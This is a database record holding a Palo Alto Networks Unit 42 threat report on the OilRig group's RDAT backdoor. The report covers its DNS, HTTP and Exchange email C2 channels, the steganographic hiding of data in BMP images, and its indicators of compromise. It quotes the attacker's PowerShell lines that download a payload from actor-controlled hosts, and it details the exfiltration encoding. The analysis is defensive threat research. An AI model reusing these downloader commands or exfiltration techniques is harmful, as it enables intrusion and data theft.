{
    "id": "26e0565c-9918-4541-97c9-0e431de8aaa2",
    "created_at": "2023-01-12T15:05:01.091295Z",
    "updated_at": "2025-03-27T02:17:27.659391Z",
    "deleted_at": null,
    "sha1_hash": "1cb0f20795b750eca1b278b65e0cdd946b304f8f",
    "title": "2020-07-22 - OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory",
    "authors": "",
    "file_creation_date": "2022-05-28T00:36:05Z",
    "file_modification_date": "2022-05-28T00:36:05Z",
    "file_size": 2686082,
    "plain_text": "# OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory\n\n**[unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/](https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/)**\n\nRobert Falcone July 22, 2020\n\nBy [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nJuly 22, 2020 at 6:00 AM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [AutoFocus,](https://unit42.paloaltonetworks.com/tag/autofocus/) [Cortex,](https://unit42.paloaltonetworks.com/tag/cortex/) [dns tunneling,](https://unit42.paloaltonetworks.com/tag/dns-tunneling/) [EMEA,](https://unit42.paloaltonetworks.com/tag/emea/) [Mimikatz,](https://unit42.paloaltonetworks.com/tag/mimikatz/) [OilRig,](https://unit42.paloaltonetworks.com/tag/oilrig/) [steganography,](https://unit42.paloaltonetworks.com/tag/steganography/) [WildFire](https://unit42.paloaltonetworks.com/tag/wildfire/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/oilrig-novel-c2-channel-steganography/)\n\n## Executive Summary\n\n\n-----\n\nWhile analyzing an attack against a Middle Eastern telecommunications organization, we\ndiscovered a variant of an OilRig-associated tool we call RDAT using a novel email-based\ncommand and control (C2) channel that relied on a technique known as steganography to\nhide commands and data within bitmap images attached to emails.\n\nIn May 2020, [Symantec published research on the Greenbug group targeting](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia)\ntelecommunications organizations in Southeast Asia, involving attacks made as recently as\nApril 2020. We observed similar tactics and tools associated with attacks on a\ntelecommunications organization in the Middle East in April 2020, specifically using custom\nMimikatz tools, Bitvise, PowerShell downloaders and a custom backdoor we track as RDAT.\nUnit 42 has [previously linked Greenbug to OilRig, a threat group we discovered in 2015. We](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/)\nhad first seen the RDAT tool used in OilRig's operations back in 2017, but we later found a\nrelated sample created in 2018 that used a different command and control channel. When\nwe analyzed this sample, we found a novel email-based C2 channel used in combination\nwith steganography to exfiltrate data.\n\nWe have been tracking RDAT since 2017, when we first saw this tool uploaded to a webshell\n[related to the TwoFace webshell discussed in our Striking Oil blog published on September](https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/)\n26, 2017. RDAT has been under active development since 2017, resulting in multiple\nvariations of the tool that rely on both HTTP and DNS tunneling for C2 communications. In\nJune 2018, the developer of RDAT added the ability to use Exchange Web Services (EWS)\nto send and receive emails for C2 communications. This email-based C2 channel is novel in\nits design, as it relies on steganography to hide commands and exfiltrates data within BMP\nimages attached to the emails. The combination of using emails with steganographic images\nto carry the data across the C2 can result in this activity being much more difficult to detect\nand allow for higher chances of defense evasion.\n\nPalo Alto Networks customers are protected by WildFire and Cortex XDR, which identifies all\nRDAT samples as malicious, as well as DNS Security and URL Filtering, which identifies and\nblocks the C2 activity.\n\n## Attack Details\n\nWe first discovered the existence of RDAT on October 7, 2017, when we observed it being\nuploaded to a webshell 11 days after we had published our research exposing webshell\nactivity by this adversary. We believe the group attempted to use the RDAT payload for\ncontinued access to the server once the use of the webshell was exposed.\n\nIn April 2020, we observed activity involving the potential breach of a telecommunications\norganization in the Middle East. The files associated with this activity included custom\nMimikatz samples for dumping credentials, a sample of the Bitvise client we believe was\nused to create SSH tunnels, and a custom backdoor called RDAT. From the initial RDAT\nsample we collected, we were able to expand the sample set and relate previously seen\n\n\n-----\n\nISMDOOR samples as well. Given the combination of the use of RDAT in OilRig-related\nwebshells, code similarities and tactical similarities, we are confident RDAT is a tool\ndeployed by OilRig.\n\nTwo of the related tools collected had PDB paths similar to ones we had seen in the past.\nThe PDB paths were C:\\Users\\Void\\Desktop\\dns\\client\\x64\\Release\\client.pdb and\nC:\\Users\\Void\\Desktop\\RDAT\\client\\x64\\Release\\client.pdb, the latter of which is the basis of\nthe tool name. Using the file path of the user in the PDB string of C:\\Users\\Void\\Desktop as\nshown in Figure 1, we gathered over a dozen samples with that file path, with most of the\nsamples identified as a known OilRig tool called ISMDOOR. Considering the small cluster of\nrelated tools, it is highly likely these have been developed by a single adversary or adversary\ngroup with control over the codebase.\n\n_Figure 1. Pivots from PDB strings_\n\nWe also observed PowerShell downloaders attempting to retrieve files from the domain\ndigi.shanx[.]icu.\n\n\n-----\n\n_Figure 2. PowerShell and infrastructure overlaps_\n\nIn Symantec’s Greenbug report, once the adversary gained interactive access to target\nhosts, they were observed executing PowerShell commands to perform post-exploitation\nactivities. In one instance, a Powershell script was executed to retrieve RDAT from the C2\napps.vvvnews[.]com, save it to C:\\Programdata\\Nt.dat, and move it to\nC:\\Programdata\\Vmware\\VMware.exe as seen in the following snippet:\n\n(New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews .com:8080/Yf.dat',\n'C:\\Programdata\\Nt.dat');\n\nmove C:\\Programdata\\Nt.dat C:\\Programdata\\Vmware\\VMware.exe -force;\n\nDuring our research, we collected a very similar PowerShell script using a different C2 and\nwith some variations in commands, but with the same file path of C:\\Programdata\\Nt.dat:\n\n$WebClient = New-Object System.Net.WebClient; $WebProxy = New-Object\nSystem.Net.WebProxy('http://192.168.3.4:8080',$true); $WebClient.Proxy = $WebProxy;Try\n{$WebClient.DownloadFile('http://digi.shanx[.]icu:8080/Nt.dat','C:\\Programdata\\Nt.dat')}\nCatch {$_.Exception.Message | out-file C:\\Programdata\\Exceptions.dat};\n\nUnfortunately, we could not verify the contents of Nt.dat due to the C2 server\nhttp://digi.shanx[.]icu:8080 being unavailable at the time of analysis.\n\n## RDAT Backdoor\n\nThe adversaries compiled the RDAT payloads used in the attacks on the Middle Eastern\ntelecommunications organization on March 1, 2020, and configured it to use a domain\nprovided on the command line or the hardcoded domain rsshay[.]com as its C2 server.\nUnlike previous RDAT samples, this particular sample only uses DNS tunneling for its C2\ncommunications with no HTTP fallback channel. This RDAT sample can only use TXT\nqueries in its DNS tunnel and will issue queries structured like the following:\n\n\n-----\n\n<encoded data>.<encoding method, 0 for base64 or 1 for base32><encryption key>.<C2\ndomain>\n\nThe encoded data portion of the subdomain is encoded base32 if the actor includes a\ncommand line argument 1 – otherwise, it uses base64. The payload also substitutes\ncharacters within the base64 encoded subdomain to avoid including characters that are not\nallowed in domain names, such as = with -, / with _ and + with -a. For example, we observed\nthe following beacon during our testing:\n\n91mzXgXT-a9sLktr-aOz8pAw--.0R2.rsshay[.]com\n\nThe encoded data in the beacon (subdomain) is ciphertext generated using AES and a 16byte key generated by concatenating two randomly chosen alphanumeric characters that are\nalso present in the subdomain immediately before the C2 domain. For instance, if the two\nrandom alphanumeric characters included in the subdomain were R2, the payload would use\nthe string R2R2R2R2R2R2R2R2 as a key to encrypt the data. The example beacon above\nwould decrypt to 1,6,1.0_Y,2619, which is structured as follows:\n\n<communications type value>,<ID value from config>,<hardcoded payload version>,\n<randomly generated number>\n\nThe payload decodes the response for an answer to the TXT query with base64 and\ndecrypts using the same AES cipher and key as the request. The payload attempts to parse\nthe decrypted cleartext using the regular expression “[^,]+” to get the command value and\nthe command arguments that are split with a comma. The payload then checks the\ncommand value using a command handler that has the ability to execute commands and\nupload and download files, as seen in Table 1.\n\n**Command** **Description**\n\n0 Idle.\n\n1 Run specified command. Creates write and read pipes to issue the command\nand read the output and sends the results to the C2 over the DNS tunnel.\n\n2 Uploads a file to the C2 by reading in a specified file and sending its contents\nover the DNS tunnel in chunks.\n\n3 Downloads a file via the DNS tunnel.\n\n_Table 1. Commands available in RDAT_\n\n## Related RDAT\n\n\n-----\n\nDuring our research, we gathered several additional samples by pivoting on the contents of\nthe executables and other various attributes. Table 2 shows when these samples were\ncompiled, their respective C2 server and the service name they use when the actor installs\nthem on the compromised system. As shown by the compilation times, this tool has been in\ndevelopment since 2017, with the most recent sample we collected being compiled in April\n2020. The sample compiled in August 2017 was uploaded to a webshell related to TwoFace,\nwhile the samples compiled in March 2020 were used in the attack on the Middle Eastern\ntelecommunications organization. The RDAT sample compiled in April 2020 was also\ndelivered to the same telecommunications organization, which was configured to use new\ninfrastructure (sharjatv[.]com, wwmal[.]com) and supported both DNS A and AAAA records\nfor its DNS tunneling C2 channel.\n\nThe most interesting sample we discovered was compiled on July 24, 2018. This sample\nincluded a novel C2 channel that used the Exchange Web Services (EWS) API to send and\nreceive emails containing steganographic images as attachments. This novel C2 channel\nsupplemented the HTTP and DNS tunneling C2 channels seen in other RDAT samples, all of\nwhich we will discuss in detail in the upcoming sections.\n\n**SHA256** **Compiled** **C2** **Service Name**\n\n7395a3ada245.. 2017-08-07 Provided as argument Service\n\n8f943bc5b205.. 2018-03-13 Provided as argument My Sample Service\n\n\n8120849fbe85.. 2018-07-24 allsecpackupdater[.]com\ntacsent[.]com\n\nkoko@acrlee[.]com\n\nh76y@acrlee[.]com\n\n\nN/A\n\n\nbcdb63b3520e.. 2018-08-27 Provided as argument N/A\n\nf42c2b40574d.. 2018-09-09 Provided as argument My Sample Service\n\nfcabb86331cd.. 2018-09-09 Provided as argument My Sample Service\n\n7b5042d3f0e9.. 2019-09-17 Provided as argument Windows Video Service\n\nee32bde60d11.. 2019-11-04 Provided as argument N/A\n\nde3f1cc2d4aa.. 2019-11-11 Provided as argument My Sample Service\n\n4ea6da6b35c4.. 2020-03-01 rsshay[.]com Windows Video Service\n\nacb50b02ab0c.. 2020-03-01 rdmsi[.]com Windows Video Service\n\n55282007716b.. 2020-03-01 rdmsi[.]com Windows Video Service\n\n\n-----\n\nba380e589261.. 2020-03-01 rsshay[.]com Windows Video Service\n\n\n6322cacf839b.. 2020-04-04 sharjatv[.]com\nwwmal[.]com\n\n_Table 2. Related RDAT samples_\n\n\nMy Sample Service\n\n\n## Novel C2 Using Exchange Web Services and Steganography\n\nThe novel C2 channel in the RDAT sample uses email for a C2 channel by interacting with\nthe local Exchange server with the EWS API. There are two hardcoded actor-controlled\nemail addresses: koko@acrlee[.]com and h76y@acrlee[.]com. These two email addresses\nare used by the RDAT payload to send and receive emails to facilitate C2. To send emails\nfrom the compromised host, the payload uses the email associated with the account logged\ninto the compromised host, as it uses the WinHTTP library to make requests to the API with\nthe \"WINHTTP_OPTION_AUTOLOGON_POLICY\" field set to\n['WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW', which automatically attempts to log](https://docs.microsoft.com/en-us/windows/win32/winhttp/option-flags)\nonto Exchange using the default credentials.\n\nThe actor communicates with the payload by sending emails from one of two email\naddresses to the email address of the compromised account. To receive emails from the\nactor, the payload will:\n\nInitially create an inbox rule to move actor’s emails to the junk folder.\nContinually look in the junk folder for actor-sent emails that have attachments.\nProcess attachments for inbound commands hidden within BMP images.\n\nTo communicate with the actor, the payload sends emails from the account logged into the\ncompromised system and performs the following actions:\n\nCreates a draft email with the actor-controlled email address in the “To” field.\nAttaches a BMP image with a hidden message or data to exfiltrate to the draft.\nSends the draft to the actor’s email address.\n\nTo show this channel, we analyzed the outbound HTTP POST requests to the EWS API and\ntook screenshots of the requests. The POST requests all have an anomalous “User-Agent”\nof “firefox” and use Simple Object Access Protocol (SOAP) messages to interact with the\nExchange server. The first request has a SOAP message to create an inbox rule named\n\"ExchangeRule\" that moves all inbound emails from the C2 email addresses to the\n\"junkemail\" folder. Figure 3 shows the HTTP POST request containing the SOAP message\nthat creates this inbox rule. The rule name is highlighted in the red box, the condition that\nincludes the actor’s email address in the blue box and the action to move it to the junk folder\nin the green box.\n\n\n-----\n\n_Figure 3. HTTP POST request creating the inbox rule to move emails from actor to the junk_\n_folder_\n\nThe payload will then continually look for new emails from the actor in the junk folder. The\npayload will issue a request to the EWS API to check for unread emails from the actor’s\nemail addresses with an attachment. Figure 4 shows the HTTP POST the payload issues to\ncheck for inbound emails from the actor, with the actor’s email address in the red box, the\ncheck for an attachment in the blue box and the junk folder specified in the green box.\n\n_Figure 4. HTTP POST request sent to the Exchange server looking for inbound emails from_\n_actor_\n\nIf the payload obtains an email sent by the actor, the payload will process the response to\nthe SOAP request and send additional requests to the EWS API to get the email, the\nattachment and the contents of the attachment. The payload processes the responses to\nthese requests using regular expressions to find specified values within the XML. The\npayload uses the regular expressions to find the following values within the server’s\nresponse:\n\nId and ChangeKey to get the specified email.\n\n\n-----\n\nAttachmentId Id to get the attachment from the email.\n<t:Content> and </t:Content> to get the contents of the attachment.\n\nIt then saves this content to a file in the %TEMP% folder with a \".bmp\" file extension. It then\nissues a SOAP request to delete the processed email. This completes the process in which\nthe payload receives inbound communications from the actor.\n\nTo send its beacon and exfiltrate data to the actor, the payload will interact with the EWS API\nto perform the following three steps:\n\n1. Save a draft email with the actor’s email address in the “To” field.\n2. Attach the BMP image containing the hidden data to the saved draft email.\n3. Send the saved draft email.\n\nFigure 5 shows the draft email with the BMP image attached immediately prior to being sent.\nThe figure shows the actor’s email address in the “To” field, the BMP image with hidden data\nas the attachment, and subjects and message bodies containing strings of an unknown\npurpose.\n\n_Figure 5. Screenshot of Outlook Web App showing the email draft created by the payload_\n_prior to it being sent to the actor_\n\nTo carry out this functionality, the payload creates an email and saves it as a draft. This\nallows it to attach the image containing the hidden data prior to sending the email. Figure 6\nshows the SOAP request to the EWS API, specifying that the server should save the email to\nthe drafts folder in the red and blue boxes and the actor’s email address in the green box.\n\n\n-----\n\n_Figure 6. HTTP POST request creating the email draft prior to attaching the image_\n\nWith the email saved in the drafts folder, the payload will then attach the BMP image to the\nemail using an HTTP POST request to the EWS API. Figure 7 shows the request to the EWS\nAPI that includes the filename of the attachment in the red box and the base64 content of the\nattachment in the blue box.\n\n_Figure 7. HTTP POST request attaching the image to the email draft_\n\nThe payload issues one last request to the EWS API to send the email draft with the\nattached BMP image to the actor. Figure 8 shows the HTTP POST request issued by the\npayload to send the email with the SendItem action highlighted in the red box.\n\n\n-----\n\n_Figure 8. HTTP POST request sending the email draft to the actor s email address_\n\n**Hiding Data with Steganography**\n\nThe payload will receive data from and exfiltrate data to the C2 within email attachments,\nspecifically within the BMP images that use steganography to hide the data within the image.\nThe method with which the payload extracts data from the BMP image to receive data from\nthe C2 is the same as its method for hiding data to exfiltrate. While we did not observe the\nC2 using this method to send commands, we were able to analyze the payload to determine\nhow it would send messages and exfiltrate data from the system.\n\nTo send data using this C2 channel, the payload will read the following image available on a\ndefault install of Windows:\n\nC:\\ProgramData\\Microsoft\\User Account Pictures\\guest.bmp\n\nDepending on the version of Windows, the “guest.bmp” image differs in size and\ncontents.The image from Windows 7 is 128x128 pixels and contains an image of a suitcase,\nwhile the Windows 10 image is 448x448 pixels and contains a generic user icon. Figure 9\nshows the two images extracted from default installations of Windows 7 and 10 with the latter\nscaled down in size.\n\n_Figure 9. The “guest.bmp” image from Windows 7 on the left and Windows 10 on the right_\n\nThe payload determines the height, width and color depth of the image and calculates how\nmany images it will need to modify to send the entirety of the data:\n\n(length of data)/(width*(height-1))\n\nIt uses the modulo operator to check if there is data that does not fit in the previous image\nand will add one to the required image count if leftover data exists. The payload then iterates\nthrough the data by grabbing a substring of the data that will fit within the image.\n\nTo explain how the payload hides data within this image, we must first briefly explain the\nBMP file format. The BMP file format includes file headers and an array of values used to\nstore the red, green and blue color values of each pixel in the image. The format of each\ncolor value in the array of color values varies depending on the color depth, as 24-bit BMP\n\n\n-----\n\nimages will use 3-byte values that are used to specify the intensities of red, blue and green\ncolors for each pixel in the image, while 32-bit images use 4-byte values. The RDAT payload\ncan support both 24- and 32-bit images. Since both “guest.bmp” images from Windows 7\nand 10 are 24-bit images, we observed the payload using the 3-byte color values for each\npixel to hide data. The payload will modify each pixel’s 3-bytes to transmit one byte of\nexfiltrated data. By spreading the data byte over the 3-bytes for each pixel, the impact on the\noriginal image is minor and difficult to visualize. Figure 10 compares the original image from\nWindows 7 and the modified image carrying the hidden data.\n\n_Figure 10. Original “guest.bmp” image from Windows 7 on the left and the modified carrier_\n_image on the right_\n\nFigure 10 shows how difficult it is to see the hidden data embedded within the BMP image.\nWe zoomed in on the 29 pixels modified to carry the data to visualize the differences and\nfound that they differed slightly in color, as seen in the comparison in Figure 11. All the pixels\nin the two images are different. However, some of the differences in color are more obvious\nthan others.\n\n_Figure 11. This zoomed-in view shows the original pixels on top and pixels carrying 29-bytes_\n_of data on the bottom_\n\nTo hide the data within the image, the payload will check the color depth of the “guest.bmp”\nimage for either 24- or 32-bit depth, which allows the payload to determine how many bytes\nper pixel it will need to spread the bits of the hidden data across. For instance, a 24-bit BMP\nimage like \"guest.bmp\" from Windows 7, seen in Figure 10 above, will have three bytes per\npixel in the image that represents the red, green and blue values for that pixel. Using this 24bit image, the payload will spread the 8-bits of the data byte across these three bytes,\nspecifically by setting the least significant bit values in the pixel bytes to the bit values of the\ndata byte.\n\n\n-----\n\nLet s use the example data 8,54351-1616479009,0 from a beacon sent from the payload to\nthe C2, which it will encode using base64 to OCw1NDM1MS0xNjE2NDc5MDA5LDA=,\nappend the @ symbol and embed within a BMP image. The O ASCII character has a\nhexadecimal value of 0x4f, which is 01001111 in base2. The 8-bits of this base2\nrepresentation are then used to set specific bits within the 3-bytes for each pixel:\n\nData bits 0 and 1 replacing the first pixel byte's bits 1 and 0.\nData bits 2, 3 and 4 replacing the second pixel byte’s bits 2, 1 and 0.\nData bits 5, 6 and 7 replacing the third pixel byte's bits 2, 1 and 0.\n\nUsing this logic, the payload will read the pixel bytes from the “guest.bmp” image, which is\n0xe4, 0xdf and 0xb9 and replace the following bits using the base2 of 010 011 11 for O:\n\nReplace bits 2, 1 and 0 within 0xe4 with 010, which results in 0xe2.\nReplace bits 2, 1 and 0 within 0xdf with 110, which results in 0xde.\nReplace bits 1 and 0 within 0xb9 with 11, which results in 0xbb.\n\nFigure 12 below shows how these bit replacements occur and how the replacements\nultimately change the values of the pixel's bytes.\n\n_Figure 12. Visual explanation of the bit replacement performed on each pixel to hide data in_\n_the BMP images_\n\n## HTTP and DNS Tunneling C2 Channels\n\nThe RDAT sample with the novel EWS C2 channel also had HTTP and DNS tunneling as C2\nchannels as well, which are very similar to other RDAT samples we collected. The HTTP C2\nchannel uses HTTP POST requests to transmit data to the C2 server. The code contains the\nfollowing two domains:\n\nallsecpackupdater[.]com\n\ntacsent[.]com\n\n\n-----\n\nIt should be noted that the code only attempts to use the tacsent[.]com domain for its HTTP\nC2 channel. We are unsure why the code contains the allsecpackupdater[.]com domain as it\ndoes not attempt to communicate with it, but it is possible that it is an artifact from a previous\nversion of the tool. This domain was previously tied to the OilRig threat group, as ClearSky\ndiscovered this domain in 2017 and noted its relation to Greenbug’s ISMDOOR tool.\n\nThe HTTP POST requests have a custom \"From:\" field in the header that has a unique\nidentifier assigned to the infected system. The HTTP POST request will contain a \"v\"\nparameter and a random number in the URL and a user-agent of \"chrome.\" Figure 13 shows\nan example of an HTTP POST issued by the payload as its initial beacon to the C2, which\nshows the anomalous user-agent “chrome” and custom “From” field.\n\n_Figure 13. Initial beacon sent by RDAT sample over its HTTP C2 channel_\n\nThe payload encrypts the data sent in the POST request using the AES cipher, specifically in\nCBC mode. To decrypt this data, the data itself is first converted from the URL-safe\nhexadecimal percent encoded characters to their /, + and = character equivalent. After this\nconversion, the resulting data is decoded using base64 and then decrypted using AES and\nthe value in the From field as a key and initialization vector (IV). For instance, using the From\nvalue for the key and IV to decrypt the POST data with the AES cipher produces the\nfollowing cleartext:\n\n1,1543511637567325,12031\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\n\nThe payload will check the C2 server's response to this HTTP POST for a, using a regular\nexpression [^,]+ to determine if the C2 provided a command. The payload can only exfiltrate\n102,400 bytes of data at a time, which it uses a field in the exfiltrated response to notify the\nC2 of the offset of the data so the C2 can reconstruct it.\n\n\n-----\n\nThe DNS tunneling protocol is very similar to the protocol discussed earlier in this blog, as it\nuses the second level subdomain for its AES key but uses four characters instead of two. It\nalso uses the same character replacement of = with -, / with _ and + with -a to remove\ncharacters that are not allowed in domain names, as did the RDAT sample used in the\nattacks on the Middle Eastern telecommunications organization. The DNS tunnel for this\nsample used DNS A record queries and the same domain as the HTTP C2 channel, which\ngenerates an initial beacon that will resemble the following:\n\nP9rktZsukI5RVAdZWSR-a6uVYKeQJ-azhVLzUUfGs1TDQ-.fN26.tacsent[.]com\n\nTo decrypt this beacon, the C2 uses the second level subdomain to create an AES key and\nIV of fN26fN26fN26fN26, which is the second-level domain used four times to create a 16byte string. The resulting cleartext would contain the following message, which is a commaseparated string that includes communication type and a unique system identifier:\n\n3,1543511637567325,0\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\n\nTo exfiltrate data using this DNS tunneling protocol, the payload will add additional\nsubdomains to query, specifically a field for the data sequence number and a field for the\nexfiltrated data. For instance, the following DNS query sends system information to the C2:\n\n1.44gkxXizTF3QJU0F2AllV_0qhr1xcYmy8GeMB6nnGNSw0bls7JpP0zIqvnyO.xEZlrurmSHgf\n\nuoAcqi9blguWDzwH9oQCWZ-aTeBSBE2M-.tJ8z.tacsent[.]com\n\nThe fifth-level subdomain is a data sequence number that allows the C2 server to\nreassemble the data, which will start with 1 and increment by 60 as the DNS tunneling\nprotocol sends 60-bytes of encoded ciphertext within each DNS request. The fourth-level\nsubdomain contains the 60-bytes of encoded ciphertext that RDAT sends to the C2, while\nthe third- and second-level subdomains are the same as the beacon. In the above example,\nthe AES key and IV would be tJ8ztJ8ztJ8ztJ8z, which would decrypt the third-level\nsubdomain to the following cleartext:\n\n2,1543511637567325,0\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\n\nUsing the same AES key and IV, the cleartext in the fourth-level subdomain includes the\nsystem information, which in the above example would produce:\n\n1:|2:MicrosoftWindows7Professionw\\x01\n\nRegardless of the C2 channel used, the RDAT sample parses responses using a command\nhandler to determine the course of action to take. Table 3 shows the commands available\nwithin the command handler, as well as the structure of the response message the payload\n\n\n-----\n\nwould send to the C2. The command handler in this RDAT sample has more capabilities\ncompared to the three commands available in the sample seen in the attacks on the Middle\nEastern telecommunications organization.\n\n\n**Command**\n**Structure**\n\n\n**Response**\n**structure**\n\n\n**Description**\n\n\n0, Idle.\n\n\n1,<task\nnumber>,\n<base64\nencoded\ncommand\nto execute>\n\n2,<task\nnumber>,\n<cleartext\nfilename>\n\n3,<task\nnumber>,\n<filename>,\n<file size>\n\n\n2,<16-char\nsystem\nidentifier>,\n<task\nnumber>,\n<base64\nencoded\nresults>,\n<offset in\ndata>,<total\ndata length>\n\n3,<16-char\nsystem\nidentifier>,\n<task\nnumber>,\n<base64\nencoded file\ncontents>,\n<offset in\ndata>,<total\ndata length>\n\n4,<16-char\nsystem\nidentifier>,\n<task\nnumber>,\n<offset in\ndata>,\n<random\nnumber>\n\n\nExecutes command using \"cmd.exe /c\"\n\nUploads a specified file from the system.\n\nDownloads a file from the C2 response to a temporary file\nnamed %TEMP%\\tmp<random number>. Downloads 81,920\nbytes at a time by sending HTTP POST requests with a\ncommunications type of \"4\" with the offset in the data it\nwishes to receive and parsing the response for data it will\nwrite to the file. Payload then opens the file, base64 decodes\nand decrypts its contents with AES CBC. Sends \"-1\" as the\noffset to C2 to notify the C2 that it decoded/decrypted the\ntemporary file and wrote it to the specified file.\n\n\n-----\n\n5,<task\nnumber>\n\n6,<task\nnumber>\n\n7,<task\nnumber>\n\n\n6,<16-char\nsystem\nidentifier>,\n<task\nnumber>,\n<base64\nencoded\nscreenshot>,\n<unk, size?>\n\n7,<16-char\nsystem\nidentifier>,\n<task\nnumber>,\"\n<EOF>\"\n\n7,<16-char\nsystem\nidentifier>,\n<task\nnumber>,\"\n<EOF>\"\n\n\nTakes a screenshot, encodes it as a JPEG, base64 encodes\nthe JPEG image.\n\nKills the payload's process and reruns it using the \"-r\"\ncommand line switch by running the following on the\ncommand line: taskkill /f /pid <current PID> && <current\nexecutable path>\n\nUninstalls the payload by running the following on the\ncommand line: taskkill /f /pid <current PID> && del /f <current\nexecutable path>\n\n\n_Table 3. Commands available within the RDAT sample that used the novel EWS C2 channel_\n\n## Conclusion\n\nThe RDAT backdoor has been used by the OilRig threat group for at least three years to\ntarget organizations in the Middle East, with the most recent known activity occurring in April\n2020 against a telecommunications organization. Over the course of three years, this tool\nhas received continued development efforts that have resulted in multiple variations with\ndifferences in functionality and available C2 channels. The majority of samples used some\ncombination of HTTP and DNS tunneling channels, with the single exception where we\ndiscovered the developer leveraging Exchange Web Services to send and receive emails to\nand from the actor using steganographic image file attachments. The use of a novel C2\nchannel in combination with steganography shows the continued evolution and development\nof different tactics and techniques by this adversary over time.\n\nPalo Alto Networks customers are protected in the following ways:\n\n[All RDAT samples have malicious verdicts in WildFire and have protections in place](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\nthrough Cortex XDR.\n[DNS tunneling protocols used for C2 communications are blocked via DNS Security.](https://www.paloaltonetworks.com/resources/datasheets/dns-security-service)\n[All C2 domains are classified as Command-and-Control for URL Filtering.](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security)\n[AutoFocus customers can monitor activity via the rdat_backdoor tag.](https://blog.paloaltonetworks.com/2019/11/cortex-threat-intelligence/)\n\n\n-----\n\n## Appendix\n\n**Files Associated with Attack on Telecommunications Organization**\n\n4ea6da6b35c4cdc6043c3b93bd6b61ea225fd5e1ec072330cb746104d0b0a4ec - RDAT\nbackdoor\n\ne53cc5e62ba15e43877ca2fc1bee16061b4468545d5cc1515cb38000e22dd060 - Custom\nMimikatz\n\n476b40796be68a5ee349677274e438aeda3817f99ba9832172d81a2c64b0d4ae - Bitvise\nclient\n\n78584dadde1489a5dca0e307318b3d2d49e39eb3987de52e288f9882527078d5 PowerShell downloader\n\n**RDAT Samples**\n\n7395a3ada245df6c8ff1d66fcb54b96ae12961d5fd9b6a57c43a3e7ab83f3cc2\n\n8f943bc5b20517fea08b2d0acc9afe8990703e9d4f7015b98489703ca51da7eb\n\n8120849fbe85179a16882dd1a12a09fdd3ff97e30c3dfe52b43dd2ba7ed33c2a\n\nbcdb63b3520e34992f292bf9a38498f49a9ca045b7b40caab5302c76ca10f035\n\nf42c2b40574dc837b33c1012f7b6f41fcccc5ebf740a2b0af64e2c530418e9e0\n\nfcabb86331cd5e2fa9edb53c4282dfcb16cc3d2cae85aabf1ee3c0c0007e508c\n\n7b5042d3f0e9f077ef2b1a55b5fffab9f07cc856622bf79d56fc752e4dc04b28\n\nee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc\n\nde3f1cc2d4aac54fbdebd5bd05c9df59b938eb79bda427ae26dedef4309c55a9\n\n4ea6da6b35c4cdc6043c3b93bd6b61ea225fd5e1ec072330cb746104d0b0a4ec\n\nacb50b02ab0ca846025e7ad6c795a80dc6f61c4426704d0f1dd7e195143f5323\n\n55282007716b2b987a84a790eb1c9867e23ed8b5b89ef1a836cbedaf32982358\n\nba380e589261781898b1a54c2889f3360db09c61b9155607d7b4d11fcd85bd9d\n\n6322cacf839b9c863f09c8ad9fd0e091501c9ba354730ab4809bb4c076610006\n\n**RDAT C2 Domains**\n\n\n-----\n\nrdmsi[.]com\n\nrsshay[.]com\n\nsharjatv[.]com\n\nwwmal[.]com\n\nallsecpackupdater[.]com\n\ntacsent[.]com\n\nacrlee[.]com\n\nkopilkaorukov[.]com\n\n**Related Infrastructure**\n\ndigi.shanx[.]icu\n\ntprs-servers[.]eu\n\noudax[.]com\n\nkizlarsoroyur[.]com\n\nintelligent-finance[.]site\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-22 - OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory.pdf"
    ],
    "report_names": [
        "2020-07-22 - OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory.pdf"
    ],
    "threat_actors": [
        {
            "id": "e58deb93-aff1-4be5-8deb-37fe8af0b7ed",
            "created_at": "2022-10-25T16:07:23.918534Z",
            "updated_at": "2025-03-27T02:02:10.02879Z",
            "deleted_at": null,
            "main_name": "Greenbug",
            "aliases": [
                "Greenbug",
                "Volatile Kitten"
            ],
            "source_name": "ETDA:Greenbug",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
